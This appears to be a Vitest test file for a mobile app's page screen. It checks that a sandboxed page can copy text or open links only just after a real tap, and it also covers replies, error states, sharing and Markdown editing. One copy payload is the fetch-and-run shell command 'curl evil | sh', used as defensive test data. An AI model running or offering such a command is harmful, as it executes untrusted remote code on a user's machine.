// @vitest-environment jsdom
import type { ReactNode } from "react";
import { act, createElement, forwardRef, useEffect, useImperativeHandle } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => ({
  rpc: vi.fn(),
  setOptions: vi.fn(),
  back: vi.fn(),
  share: vi.fn(),
  alert: vi.fn(),
  scrollTo: vi.fn(),
  layoutY: 0,
}));

const host = vi.hoisted(() => ({
  mode: "runtime" as "runtime" | "markdown",
  touch: {} as Record<string, ((event: object) => void) | undefined>,
  message: undefined as ((data: string, answer: (message: object) => void) => void) | undefined,
  copied: [] as string[],
  opened: [] as string[],
  t: (text: string) => text,
  routes: [] as { name: string; params?: object }[],
  went: [] as unknown[],
  html: "",
  runtimeFails: false,
  theme: "light",
  readError: null as unknown,
  page: {
    id: "page-1",
    title: "Plan",
    code: "",
    botId: "bot-1" as string | null,
    groupId: null as string | null,
  },
}));

vi.mock("react-native", () => {
  type Props = {
    children?: ReactNode;
    accessibilityLabel?: string;
    accessibilityRole?: string;
    onPress?: () => void;
    onLayout?: (event: { nativeEvent: { layout: { y: number } } }) => void;
  };
  const View = ({
    children,
    onLayout,
    accessibilityLabel,
    accessibilityRole,
    ...props
  }: Props & Record<string, unknown>) => {
    if (props.onTouchStart) host.touch = props as typeof host.touch;
    useEffect(() => {
      if (!onLayout) return;
      // Children lay out before parents, so each measured view reports the next 100pt.
      mocks.layoutY += 100;
      onLayout({ nativeEvent: { layout: { y: mocks.layoutY } } });
    }, []);
    return createElement(
      "rn-view",
      { "aria-label": accessibilityLabel, role: accessibilityRole },
      children,
    );
  };
  return {
    ActivityIndicator: () => createElement("rn-spinner"),
    Alert: { alert: mocks.alert },
    Platform: {
      get OS() {
        return host.mode === "markdown" ? "ios" : "android";
      },
      select: (options: { ios?: unknown; default?: unknown }) =>
        host.mode === "markdown" ? options.ios : options.default,
    },
    Pressable: ({ children, onPress, accessibilityLabel, accessibilityRole }: Props) =>
      createElement(
        "rn-pressable",
        { onClick: onPress, "aria-label": accessibilityLabel, role: accessibilityRole },
        children,
      ),
    ScrollView: forwardRef(({ children }: Props, ref) => {
      useImperativeHandle(ref, () => ({ scrollTo: mocks.scrollTo }));
      return createElement("rn-scroll", null, children);
    }),
    Share: { share: mocks.share },
    StyleSheet: { create: (styles: unknown) => styles, hairlineWidth: 1 },
    Text: ({ children, accessibilityRole }: Props) =>
      createElement("rn-text", { role: accessibilityRole }, children),
    TextInput: ({
      value,
      onChangeText,
      accessibilityLabel,
    }: {
      value: string;
      onChangeText: (text: string) => void;
      accessibilityLabel?: string;
    }) =>
      createElement("textarea", {
        value,
        "aria-label": accessibilityLabel,
        onChange: (event: { target: { value: string } }) => onChangeText(event.target.value),
      }),
    View,
  };
});
vi.mock("expo-clipboard", () => ({
  setStringAsync: async (text: string) => {
    host.copied.push(text);
    return true;
  },
}));
vi.mock("expo-router", () => ({
  useLocalSearchParams: () => ({
    pageId: "page-1",
    ...(host.mode === "markdown" ? { title: "Launch plan" } : {}),
  }),
  useRouter: () => ({
    back: () => {
      mocks.back();
      host.went.push("back");
    },
    canGoBack: () => true,
    push: (href: unknown) => host.went.push(href),
    replace: (href: unknown) => host.went.push(href),
  }),
  useNavigation: () => ({
    setOptions: mocks.setOptions,
    getState: () => ({ routes: [...host.routes, { name: "page" }], index: host.routes.length }),
  }),
}));
vi.mock("react-native-safe-area-context", () => ({ useSafeAreaInsets: () => ({ top: 0 }) }));
vi.mock("@rakazo/chat-ui/native", () => ({
  useNativeLinkConfirm: () => (url: string) => host.opened.push(url),
  ChatMarkdown: ({ children }: { children: string }) =>
    createElement("rn-markdown", null, children),
}));
vi.mock("../components/native-symbol", () => ({ NativeSymbol: () => null }));
vi.mock("../components/native-action-button", () => ({
  NativeActionButton: (props: {
    label?: string;
    accessibilityLabel?: string;
    icon?: { ios: string; android: string };
    onPress: () => void;
  }) =>
    createElement(
      "button",
      {
        type: "button",
        "aria-label": props.accessibilityLabel ?? props.label,
        "data-icon": props.icon ? `${props.icon.ios} ${props.icon.android}` : undefined,
        onClick: props.onPress,
      },
      props.label,
    ),
}));
vi.mock("../components/sandboxed-html-preview", () => ({
  SandboxedHtmlPreview: ({ html, onMessage }: { html: string; onMessage: typeof host.message }) => {
    host.html = html;
    host.message = onMessage;
    return null;
  },
}));
vi.mock("./api-server", () => ({}));
vi.mock("./api-auth", () => ({}));
vi.mock("./api-live", () => ({}));
vi.mock("./api", () => ({
  currentApiBase: () =>
    host.mode === "markdown" ? "https://server.example.test" : "https://app.example",
  rpc: mocks.rpc,
}));
vi.mock("./session", () => ({ registerSessionDiskCache: () => undefined }));
vi.mock("./page-runtime", () => ({ loadPageRuntime: async () => "" }));
vi.mock("./native", () => ({
  native: { page: "page", label: "label", secondaryLabel: "secondary", fill: "fill" },
  useThemedStyles: (factory: () => unknown) => factory(),
  useMobileTokens: () => ({}),
  useResolvedAppearance: () => host.theme,
}));
vi.mock("./pages", async (original) => ({
  ...(await original<typeof import("./pages")>()),
  getLatestPage: async () => {
    if (host.mode === "markdown") return PAGE;
    if (host.readError) throw host.readError;
    return host.page;
  },
  pageDocument: async (...args: unknown[]) => {
    if (host.runtimeFails) throw new Error("Page runtime returned 503");
    return `<p>page</p>${JSON.stringify(args[4] ?? {})}`;
  },
}));

vi.mock("../components/sheet-close-button", () => ({
  SheetCloseButton: ({ onPress }: { onPress: () => void }) =>
    createElement("rn-pressable", { onClick: onPress, "aria-label": "Close" }),
}));
vi.mock("./i18n", () => {
  // The app's t is one stable function; a new one per render would refetch the page forever.
  const t = (text: string, values?: Record<string, string>) =>
    text.replace(/\{(\w+)\}/g, (_, key: string) => values?.[key] ?? "");
  return { dateLocaleForUi: () => "en-US", useI18n: () => ({ t }) };
});
vi.mock("./side-insets", () => ({ useSideInsets: () => ({}) }));

const PAGE = {
  id: "page-1",
  artifactId: "artifact-2",
  botId: "bot-1",
  groupId: null,
  title: "Launch plan",
  snippet: "Why now.",
  version: 2,
  createdAt: "2026-10-25T10:00:00.000Z",
  updatedAt: "2026-10-25T11:00:00.000Z",
  markdown: "# Launch plan\n\nWhy now.\n\n## Goals\n\nShip it.\n\n## Timeline\n\nQ4.",
};

const { default: PageScreen } = await import("../app/page");
const { takePageReply } = await import("./pages");

/** A finger at `x`,`y` on the screen, as React Native reports a touch. */
const at = (x: number, y: number, fingers = 1) => ({
  nativeEvent: { pageX: x, pageY: y, touches: Array.from({ length: fingers }) },
});

it("copies and opens links for a page only right after the person tapped it", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  const now = vi.spyOn(Date, "now").mockReturnValue(1_000_000);
  const root = createRoot(document.createElement("div"));
  await act(async () => root.render(createElement(PageScreen)));
  const send = (data: object) =>
    act(async () => {
      host.message?.(JSON.stringify(data), () => undefined);
      await new Promise((resolve) => setTimeout(resolve, 0));
    });
  const touch = (name: string, x: number, y: number, fingers?: number) =>
    host.touch[name]?.(at(x, y, fingers));
  const copy = { type: "rakazo-page:copy", id: "a", text: "curl evil | sh" };
  const link = { type: "rakazo-page:open-link", url: "https://example.com/x" };
  const attempt = async () => {
    await send(copy);
    await send(link);
  };

  // On load, with a finger still down and no tap yet, a page asks for nothing it gets.
  touch("onTouchStart", 100, 100);
  await attempt();
  // A scroll is not a tap, even one that comes back to where it started.
  touch("onTouchMove", 100, 160);
  touch("onTouchEnd", 100, 101);
  await attempt();
  // Or a flick too quick to report a move.
  touch("onTouchStart", 100, 100);
  touch("onTouchEnd", 100, 200);
  await attempt();
  // Nor is a pinch.
  touch("onTouchStart", 100, 100, 2);
  touch("onTouchEnd", 100, 100);
  await attempt();
  // A touch the system took over (a back swipe) is not one either.
  touch("onTouchStart", 100, 100);
  host.touch.onTouchCancel?.({});
  touch("onTouchEnd", 100, 100);
  await attempt();
  expect([host.copied, host.opened]).toEqual([[], []]);

  touch("onTouchStart", 100, 100);
  touch("onTouchMove", 104, 103);
  touch("onTouchEnd", 104, 103);
  now.mockReturnValue(1_000_800);
  // One tap is one action: the link the page asks for with that same tap waits for another.
  await attempt();
  expect([host.copied, host.opened]).toEqual([["curl evil | sh"], []]);
  touch("onTouchStart", 100, 100);
  touch("onTouchEnd", 100, 100);
  await send(link);
  await send(copy);
  expect(host.copied).toHaveLength(1);
  // Links go through the same prompt as a link in chat.
  expect(host.opened).toEqual(["https://example.com/x"]);

  // A second after the tap the page is on its own again.
  touch("onTouchStart", 100, 100);
  touch("onTouchEnd", 100, 100);
  now.mockReturnValue(1_001_801);
  await attempt();
  expect(host.copied).toHaveLength(1);
  expect(host.opened).toHaveLength(1);
  await act(async () => root.unmount());
});

it("does not let a page that reloads right after a tap act on that tap", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  vi.spyOn(Date, "now").mockReturnValue(3_000_000);
  host.copied = [];
  const root = createRoot(document.createElement("div"));
  await act(async () => root.render(createElement(PageScreen)));
  const copy = () =>
    act(async () => {
      host.message?.(JSON.stringify({ type: "rakazo-page:copy", id: "a", text: "x" }), () => {});
      await new Promise((resolve) => setTimeout(resolve, 0));
    });
  host.touch.onTouchStart?.(at(10, 10));
  host.touch.onTouchEnd?.(at(10, 10));
  // The system switches to dark mode, so the page loads again within the same second.
  host.theme = "dark";
  await act(async () => root.render(createElement(PageScreen)));
  await copy();
  expect(host.copied).toEqual([]);
  host.touch.onTouchStart?.(at(10, 10));
  host.touch.onTouchEnd?.(at(10, 10));
  await copy();
  expect(host.copied).toEqual(["x"]);
  host.theme = "light";
  await act(async () => root.unmount());
});

it("puts a tapped reply in the page's own chat unsent, closing the page or opening that chat", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  const now = vi.spyOn(Date, "now").mockReturnValue(2_000_000);
  const show = async () => {
    const root = createRoot(document.createElement("div"));
    await act(async () => root.render(createElement(PageScreen)));
    return root;
  };
  const tapThenReply = async (text: string, delay = 500) => {
    host.touch.onTouchStart?.(at(50, 50));
    host.touch.onTouchEnd?.(at(50, 50));
    now.mockReturnValue(2_000_000 + delay);
    await act(async () =>
      host.message?.(JSON.stringify({ type: "rakazo-page:reply", text }), () => {}),
    );
    now.mockReturnValue(2_000_000);
  };
  host.went = [];

  // Opened from its chat: the reply goes back there.
  host.routes = [{ name: "thread", params: { botId: "bot-1" } }];
  let root = await show();
  expect(host.html).toContain('{"reply":true}');
  await act(async () =>
    host.message?.(JSON.stringify({ type: "rakazo-page:reply", text: "B" }), () => {}),
  );
  await tapThenReply("Pick  option\n B", 1_200);
  expect([host.went, takePageReply("bot-1")]).toEqual([[], null]);
  await tapThenReply("Pick  option\n B");
  expect(host.went).toEqual(["back"]);
  expect(takePageReply("bot-2")).toBeNull();
  expect(takePageReply("bot-1")).toEqual({
    text: "Pick option B",
    page: { id: "page-1", title: "Plan" },
  });
  expect(takePageReply("bot-1")).toBeNull();
  await act(async () => root.unmount());

  // Opened from somewhere else, such as another chat: the page's group chat opens in its place.
  host.went = [];
  host.routes = [{ name: "thread", params: { botId: "bot-9" } }];
  host.page = { ...host.page, groupId: "group-1" };
  root = await show();
  await tapThenReply("Watch it");
  expect(host.went).toEqual([{ pathname: "/group-thread", params: { groupId: "group-1" } }]);
  expect(takePageReply("group-1")).toEqual({
    text: "Watch it",
    page: { id: "page-1", title: "Plan" },
  });
  await act(async () => root.unmount());

  // A page whose chat is gone offers no replies at all.
  host.went = [];
  host.page = { ...host.page, botId: null, groupId: null };
  root = await show();
  expect(host.html).toContain('{"reply":false}');
  await tapThenReply("Orphan");
  expect(host.went).toEqual([]);
  host.page = { ...host.page, botId: "bot-1" };
  await act(async () => root.unmount());
});

it("says a page that could not load in the user's words, with Try again unless it is gone", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  const render = async () => {
    const container = document.createElement("div");
    const root = createRoot(container);
    await act(async () => root.render(createElement(PageScreen)));
    return { container, root };
  };
  // The page reads, but its runtime fails to download.
  host.html = "";
  host.runtimeFails = true;
  const failed = await render();
  expect(failed.container.textContent).toBe("Could not load this page.Try again");
  host.runtimeFails = false;
  await act(async () => failed.container.querySelector("button")!.click());
  expect(host.html).toContain("<p>page</p>");
  expect(failed.container.textContent).toBe("");
  await act(async () => failed.root.unmount());

  // A deleted page says so, and trying again cannot bring it back.
  host.readError = Object.assign(new Error("Resource not found"), { code: "NOT_FOUND" });
  const gone = await render();
  expect(gone.container.textContent).toBe("This page isn't available");
  expect(
    [...gone.container.querySelectorAll("button")].map((button) => button.textContent),
  ).toEqual([""]);
  host.readError = null;
  await act(async () => gone.root.unmount());
});

it("closes and shares the page with the native icon buttons", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  host.went = [];
  const container = document.createElement("div");
  const root = createRoot(container);
  await act(async () => root.render(createElement(PageScreen)));
  const buttons = [...container.querySelectorAll("button")];
  expect(
    buttons.map((button) => [
      button.getAttribute("aria-label"),
      button.dataset.icon,
      button.textContent,
    ]),
  ).toEqual([
    ["Close", "xmark close", ""],
    ["Share", "square.and.arrow.up share-outline", ""],
  ]);
  await act(async () => buttons[0]!.click());
  await act(async () => buttons[1]!.click());
  expect(host.went).toEqual(["back", { pathname: "/page-share", params: { pageId: "page-1" } }]);
  await act(async () => root.unmount());
});

describe("editable Markdown pages", () => {
  let root: ReturnType<typeof createRoot>;
  let header: ReturnType<typeof createRoot>;
  let container: HTMLDivElement;
  let headerContainer: HTMLDivElement;

  beforeEach(() => {
    host.mode = "markdown";
    vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
    mocks.layoutY = 0;
    for (const mock of [mocks.setOptions, mocks.back, mocks.alert, mocks.scrollTo])
      mock.mockReset();
    mocks.share.mockReset().mockResolvedValue({ action: "sharedAction" });
    mocks.rpc.mockReset().mockImplementation(async (proc: string) => {
      if (proc === "pages/get") return PAGE;
      throw new Error(`unexpected ${proc}`);
    });
    container = document.createElement("div");
    headerContainer = document.createElement("div");
    root = createRoot(container);
    header = createRoot(headerContainer);
  });
  afterEach(async () => {
    await act(async () => {
      root.unmount();
      header.unmount();
    });
    vi.unstubAllGlobals();
    host.mode = "runtime";
  });

  async function renderScreen() {
    await act(async () => root.render(<PageScreen />));
  }

  /** Draws the latest native header buttons so a test can tap them. */
  async function renderHeader() {
    const options = mocks.setOptions.mock.calls.at(-1)?.[0];
    await act(async () =>
      header.render(
        <>
          {options.headerLeft()}
          {options.headerRight()}
        </>,
      ),
    );
    return options as { title: string };
  }

  function tap(element: Element | null | undefined) {
    return act(async () => (element as HTMLElement).click());
  }

  it("reads a page with its title once, an On this page list, and anchored jumps", async () => {
    await renderScreen();
    expect(mocks.rpc).toHaveBeenCalledWith("pages/get", { pageId: "page-1" });
    expect(container.querySelector('rn-text[role="header"]')?.textContent).toBe("Launch plan");
    expect([...container.querySelectorAll("rn-markdown")].map((node) => node.textContent)).toEqual([
      "Why now.",
      "## Goals\n\nShip it.",
      "## Timeline\n\nQ4.",
    ]);
    const contents = container.querySelector('rn-view[aria-label="On this page"]');
    const links = [...(contents?.querySelectorAll('rn-pressable[role="link"]') ?? [])];
    expect(links.map((link) => link.textContent)).toEqual(["Goals", "Timeline"]);

    // The two sections lay out at 100 and 200 within the body, then the body at 300.
    await tap(links[1]);
    expect(mocks.scrollTo).toHaveBeenCalledWith({ y: 300 + 200 - 12, animated: true });
    expect((await renderHeader()).title).toBe("Launch plan");
  });

  it("closes with the X and shares the signed-in link", async () => {
    await renderScreen();
    await renderHeader();
    await tap(headerContainer.querySelector('[aria-label="Share"]'));
    expect(mocks.share).toHaveBeenCalledWith({
      url: "https://server.example.test/app/pages/page-1",
      title: "Launch plan",
    });
    await tap(headerContainer.querySelector('[aria-label="Close"]'));
    expect(mocks.back).toHaveBeenCalledTimes(1);
  });

  it("edits the markdown and saves it as the next version", async () => {
    await renderScreen();
    await renderHeader();
    await tap(headerContainer.querySelector('[aria-label="Edit"]'));
    const textarea = container.querySelector("textarea");
    expect(textarea?.value).toBe(PAGE.markdown);

    const markdown = `${PAGE.markdown}\n\n## Owners\n\nAda.`;
    mocks.rpc.mockImplementation(async (proc: string) => {
      if (proc === "pages/update") return { ...PAGE, version: 3, markdown };
      throw new Error(`unexpected ${proc}`);
    });
    const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")?.set;
    await act(async () => {
      setter?.call(textarea, markdown);
      textarea?.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await renderHeader();
    const save = [...headerContainer.querySelectorAll("rn-pressable")].find(
      (node) => node.textContent === "Save",
    );
    await tap(save);

    expect(mocks.rpc).toHaveBeenLastCalledWith("pages/update", {
      pageId: "page-1",
      markdown,
      baseVersion: 2,
    });
    expect(container.querySelector("textarea")).toBeNull();
    expect(container.textContent).toContain("Ada.");
  });

  it("explains a save that lost to a newer version and keeps the draft", async () => {
    await renderScreen();
    await renderHeader();
    await tap(headerContainer.querySelector('[aria-label="Edit"]'));
    mocks.rpc.mockRejectedValue(Object.assign(new Error("stale"), { code: "CONFLICT" }));
    await renderHeader();
    const save = [...headerContainer.querySelectorAll("rn-pressable")].find(
      (node) => node.textContent === "Save",
    );
    await tap(save);
    expect(mocks.alert).toHaveBeenCalledWith(
      "Could not save this page",
      "This page changed since you opened it. Close it and open it again to edit the latest version.",
    );
    expect(container.querySelector("textarea")?.value).toBe(PAGE.markdown);
  });
});
